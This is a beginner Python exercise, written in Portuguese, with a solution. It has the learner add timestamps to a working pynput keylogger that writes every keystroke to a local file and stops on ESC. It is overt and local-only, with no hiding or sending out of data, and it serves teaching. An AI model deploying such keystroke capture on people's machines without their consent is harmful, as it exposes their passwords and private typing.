"""
EXERCÍCIO NÍVEL 1 - INICIANTE
Adicionar Timestamps aos Logs

Objetivo: Aprender a usar datetime e melhorar a captura de eventos.

Instruções:
1. Modifique a função on_press para adicionar data/hora
2. Teste o código
3. Verifique o arquivo keys.log
"""

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keys_nivel1.log"


def on_press(key):
    """Captura tecla pressionada com timestamp"""
    try:
        # TODO: Adicione datetime aqui
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            # Formato: [YYYY-MM-DD HH:MM:SS] tecla
            f.write(f"Key: {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"Special key: {key}\n")


def on_release(key):
    """Para quando ESC é pressionado"""
    if key == keyboard.Key.esc:
        return False


if __name__ == "__main__":
    print(f"[Nível 1] Keylogger iniciado - Logs em {LOG_FILE}")
    print("Pressione ESC para parar")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("Keylogger encerrado")


# SOLUÇÃO (retire os comentários para ver):
"""
from datetime import datetime

def on_press(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] Special: {key}\n")
"""
